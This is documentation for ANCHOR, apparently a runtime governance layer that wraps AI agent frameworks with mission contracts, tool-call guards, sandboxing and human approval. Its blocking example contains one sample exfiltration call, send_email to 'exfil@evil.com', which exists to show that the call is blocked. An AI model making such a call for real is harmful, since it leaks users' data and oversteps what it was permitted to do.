# ANCHOR

**ANCHOR** is ASHA's mission-aware governance layer for autonomous agents. It keeps agents aligned with a compiled mission contract, gates dangerous tool calls, detects suspicious action chains, validates plan outputs, and enforces OS-level side-effect constraints during tool execution.

Governance runs at **runtime**: agents and prompts do not need to mention ANCHOR.

!!! note "Developer preview"
    ANCHOR is preview in v0.4.2. Pin `asha==0.4.2` and validate on your agent stack. See [status.md](status.md).

---

## One-line adoption

```python
from asha import Agent, anchor

agent = anchor(
    Agent(provider="mock", model="mock", tools=["read_file", "email"]),
    risk_tolerance="LOW",
    isolation="auto",
    interactive=False,  # required for scripts / CI
)
result = agent.run("Analyze trends locally and write a report.")
```

Framework-specific entry points:

```python
from asha.runtime.anchor.adapters import (
    anchor_crewai,
    anchor_langchain,
    anchor_graph,  # LangGraph
    anchor_autogen,
    anchor_llamaindex,
    anchor_mcp,
    anchor_any,
)
```

Install only what you need (lite `pip install asha-si` stays free of framework deps):

```bash
pip install asha-si[crewai]
pip install asha-si[langchain]
pip install asha-si[langgraph]
pip install asha-si[llamaindex]
pip install asha-si[mcp]
pip install asha-si[anchor]   # all of the above
```

---

## Adapter support matrix

| Framework | Tier | Install | Entry point |
|-----------|------|---------|-------------|
| CrewAI | Supported (golden) | `asha-si[crewai]` | `anchor_crewai()` |
| LangChain | Supported (golden) | `asha-si[langchain]` | `anchor_langchain()` |
| LangGraph | Supported (golden) | `asha-si[langgraph]` | `anchor_graph()` |
| LlamaIndex | Best-effort | `asha-si[llamaindex]` | `anchor_llamaindex()` |
| MCP | Best-effort | `asha-si[mcp]` | `anchor_mcp()` |
| AutoGen | Experimental | (duck-typed) | `anchor_autogen()` |
| Generic | Experimental | (stdlib) | `anchor_generic()` / `anchor_any()` |

CI installs `asha-si[anchor]` and runs golden-path + mission-drift gates headless (`ASHA_ANCHOR_INTERACTIVE=0`, `ASHA_ANCHOR_WARN_POLICY=strict`). Interactive ANCHOR demo: `streamlit run examples/showcase/streamlit_app.py` (Rogue agent page).

---

## What ANCHOR governs

| Layer | Applied |
|-------|---------|
| Mission baseline + phase refresh | kickoff / invoke / generate_reply |
| Action guard + chain guard | every tool call |
| Memory guard | after each agent step |
| Plan guard | after each agent step |
| OS sandbox | during tool execution |
| Human approval | BLOCK/REVIEW on TTY when `interactive=True` |

| Framework | Entry point | What's wrapped |
|-----------|-------------|----------------|
| **CrewAI** | `anchor_crewai()` | Crew, Agent, Task, Tool, LLM (litellm) |
| **LangChain** | `anchor_langchain()` | AgentExecutor, Runnable, BaseTool, callbacks |
| **LangGraph** | `anchor_graph()` | StateGraph / compiled graph (`invoke` / `ainvoke` / `stream` / `astream`) |
| **AutoGen** | `anchor_autogen()` | function_map, register_for_execution |
| **LlamaIndex** | `anchor_llamaindex()` | query/chat/run, agent_worker tools |
| **MCP** | `anchor_mcp()` | call_tool / acall_tool (non-destructive proxy) |
| **Generic** | `anchor_generic()` | any run/invoke + tools |

Adapters are duck-typed. Missing optional packages raise a clear `pip install asha-si[...]` hint when the target module requires that framework.

---

## Explicit ALLOW / BLOCK checks

```python
from asha.runtime.anchor import AnchorRuntime
from asha.exceptions import ASHAAnchorBlocked

runtime = AnchorRuntime(warn_policy="strict", interactive=False, risk_tolerance="LOW")
runtime.initialize_mission(
    "Analyze Q1 sales locally and write a report. Do not send data externally.",
    context={
        "available_tools": ["load_sales_data", "write_report", "send_email"],
        "local_only": True,
    },
)

assert runtime.evaluate_action_request(
    "tool_call",
    {
        "tool_name": "write_report",
        "arguments": str({"args": (), "kwargs": {"report_content": "Q1 summary"}}),
    },
)

try:
    runtime.evaluate_action_request(
        "tool_call",
        {
            "tool_name": "send_email",
            "arguments": str({"args": (), "kwargs": {"to": "exfil@evil.com"}}),
        },
        raise_on_block=True,
    )
except ASHAAnchorBlocked as err:
    print(err)
```

---

## Framework sketches

These assume the optional framework package is installed.

### CrewAI

```python
from crewai import Crew
from asha.runtime.anchor.adapters import anchor_crewai

crew = Crew(agents=[...], tasks=[...])
crew = anchor_crewai(crew, risk_tolerance="LOW", isolation="auto", interactive=False)
crew.kickoff(inputs={"topic": "Generative AI"})
```

### LangChain

```python
from langchain.agents import AgentExecutor
from asha.runtime.anchor.adapters import anchor_langchain

executor = AgentExecutor(agent=agent, tools=tools)
executor = anchor_langchain(executor, risk_tolerance="LOW", interactive=False)
result = executor.invoke({"input": "Analyze trends locally."})
```

### LangGraph

```python
from langgraph.graph import StateGraph
from asha.runtime.anchor.adapters import anchor_graph

graph = StateGraph(...)
# wrap before or after compile (both work)
app = anchor_graph(graph.compile(), risk_tolerance="LOW", interactive=False)
app.invoke({"messages": [...]})
```

### AutoGen

```python
from autogen import ConversableAgent
from asha.runtime.anchor.adapters import anchor_autogen

agent = ConversableAgent("analyst", llm_config={...})
agent = anchor_autogen(agent, risk_tolerance="LOW", interactive=False)
agent.generate_reply(messages=[{"role": "user", "content": "Analyze locally."}])
```

### LlamaIndex

```python
from llama_index.core.agent import ReActAgent
from asha.runtime.anchor.adapters import anchor_llamaindex

agent = ReActAgent.from_tools(tools, llm=llm)
agent = anchor_llamaindex(agent, risk_tolerance="LOW", interactive=False)
agent.query("Analyze trends locally and write a report.")
```

### MCP

```python
from asha.runtime.anchor.adapters import anchor_mcp

server = anchor_mcp(mcp_server, risk_tolerance="LOW", interactive=False)
server.initialize_session("Analyze data locally. Do not exfiltrate.")
result = server.call_tool("read_file", {"path": "data/trends.csv"})
```

---

## OS sandbox

| Mode | Behavior |
|------|----------|
| `off` | No sandbox enforcement |
| `auto` (default) | In-process hooks: guarded `open()`, blocked network modules (best-effort, not a full OS jail) |
| `hard` / `subprocess` | Tool runs in an isolated child process |

```python
from asha import Agent, anchor

agent = anchor(Agent(provider="mock", model="mock"), isolation="hard", interactive=False)
```

Supported modes: `off`, `auto` (in-process hooks), `hard` / `subprocess` (child process).  
This is **preview isolation**, not a container/seccomp jail. Container backends (`docker`, `bwrap`) raise a clear error and are deferred to 0.5.x; use `hard` today when you need process isolation.

---

## Human approval

When `interactive=True` (or a TTY with default resolution), ANCHOR can prompt on BLOCK/REVIEW:

```
ANCHOR HUMAN APPROVAL REQUIRED
Reason: ...
Allow this action? [y/N]:
```

Configure with `interactive=True/False`, `ASHA_ANCHOR_INTERACTIVE=0`, or `warn_policy="strict"|"permissive"`.

---

## Mental model

```
User mission prompt
       │
       ▼
 Mission contract (immutable baseline + phases)
       │
       ▼
 Tool call / memory write / plan output
       │
       ├── Action / alignment checks
       ├── Chain checks
       ├── Memory checks
       ├── Plan checks
       └── Approval (TTY or headless policy)
       │
       ▼
 Sandbox (hooks or subprocess)
```

Public docs describe the governance shape, not internal detector scores or calibration tables.

---

## API surface

| Function | Description |
|----------|-------------|
| `anchor(target)` | Universal one-line adoption (`from asha import anchor`) |
| `anchor_any(target)` | Adapter registry dispatch |
| `anchor_crewai` / `anchor_langchain` / … | Framework wrappers |
| `AnchorRuntime` | Direct mission + `evaluate_action_request` |

---

## Environment variables

| Variable | Default | Description |
|----------|---------|-------------|
| `ASHA_ANCHOR_INTERACTIVE` | auto (TTY) | `0` disables human approval prompts |
| `ASHA_ANCHOR_WARN_POLICY` | permissive (headless) | `strict` escalates WARN / REVIEW more aggressively |
| `ASHA_ANCHOR_TELEMETRY` | off | `1` enables local JSONL telemetry (opt-in) |
| `ASHA_ANCHOR_TELEMETRY_PATH` | none | Explicit telemetry file path (also enables logging) |

---

## Related

- [Tutorial](tutorial.md)
- [Architecture](architecture.md)
- [Status](status.md)
- [Security](security.md)
